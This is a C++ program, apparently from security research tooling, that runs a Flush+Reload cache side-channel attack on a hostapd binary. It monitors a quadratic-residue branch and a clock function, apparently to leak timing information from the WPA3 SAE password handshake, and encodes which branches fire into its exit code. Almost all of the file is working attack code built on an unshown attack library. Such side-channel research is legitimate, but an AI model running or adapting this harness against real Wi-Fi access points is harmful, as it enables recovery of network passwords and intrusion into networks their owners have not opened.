#include "../lib/attack/attack_manager.hpp"
#include "../lib/sampling/sampler_primitives.hpp"
#include "../lib/sampling/samplers/average_sampler.hpp"
#include "../lib/sampling/samplers/list_sampler.hpp"
#include <iostream>

const size_t CPU_CLOCK_SPEED = 3'400'000'000;
const size_t SLEEP_BETWEEN_MEASURES = 50'000; // in clock cycles
const size_t NANO_SECONDS_IN_SECONDS = 1'000'000'000;
const size_t SAMPLE_ROUNDS = 40; // k in hostapd code
const double REQUIRED_SCORE = 1.0;

AttackManager GetAttack(const std::string& path, size_t nqr_branch_addr, size_t clock_addr)
{
  auto indices = { nqr_branch_addr, clock_addr };
  auto primitive = std::make_unique<FlushSamplerPrimitive>();
  auto sampler = std::make_unique<ListSampler>(indices, SLEEP_BETWEEN_MEASURES / CPU_CLOCK_SPEED * NANO_SECONDS_IN_SECONDS,
                                               0, std::move(primitive), ListSamplerMode::Parallel);
  AttackManager attack(MemoryWrapper(path), AttackType::FlushReload, std::move(sampler));

  attack.Calibrate();
  return attack;
}

int main(int argc, char* argv[])
{
  if (argc < 4)
  {
    std::cout << "Usage: hostapd_attacker hostapd_file nqr_branch_addr clock_addr" << std::endl;
    return 1;
  }

  char* path = argv[1];
  size_t nqr_branch_addr = std::strtol(argv[2], nullptr, 16);
  size_t clock_addr = std::strtol(argv[3], nullptr, 16);

  if (nqr_branch_addr <= 0 || clock_addr <= 0)
  {
    std::cout << "Usage: hostapd_attacker hostapd_file nqr_branch_addr clock_addr" << std::endl;
    return 1;
  }

  AttackManager attack = GetAttack(path, nqr_branch_addr, clock_addr);
  std::vector<Measurement> measurements;
  std::vector<AttackResult> results;

  size_t i = 0;
  size_t good_measurements = 0;
  uint return_value = 0;
  while (true)
  {
    measurements.clear();
    results.clear();
    attack.Attack(measurements, results);
    if (results[0].score >= REQUIRED_SCORE || results[1].score >= REQUIRED_SCORE)
    {
      std::cout << "Measure number " << i << ":" << std::endl;
      std::cout << "nqr :: time: " << measurements[0].time << " score: " << results[0].score << std::endl;
      std::cout << "clock :: time: " << measurements[1].time << " score: " << results[1].score << std::endl;
      good_measurements++;


      if (results[0].score >= REQUIRED_SCORE)
      {
        return_value += (good_measurements == 1) ? 1 : 4;
      }
      if (results[1].score >= REQUIRED_SCORE)
      {
        return_value += (good_measurements == 1) ? 2 : 8;
      }
    }
    i++;

    if (good_measurements == 2)
    {
      break;
    }
  }
  std::cout << "Return value is: " << return_value << std::endl;
  return return_value;
}